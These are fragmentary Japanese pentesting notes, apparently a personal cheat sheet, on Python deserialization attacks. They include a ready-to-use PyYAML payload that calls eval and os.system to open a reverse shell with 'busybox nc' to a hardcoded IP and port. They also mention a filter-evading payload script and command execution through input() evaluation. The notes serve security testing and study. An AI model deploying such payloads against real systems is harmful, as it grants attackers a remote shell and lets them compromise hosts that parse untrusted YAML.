...
疑わしいバイナリファイルが、pickleファイルであるかを確認する
...
二重構造でフィルターに検知されにくくするペイロード作成スクリプト
...
https://hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html

```yaml
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('busybox nc 192.168.131.34 8888 -e sh')"]
```
...
（厳密にはデシリアライズではないが）input関数は、1+2 のような文字列を渡すと 3 と評価する機能がある。これを利用してコマンド実行が可能。
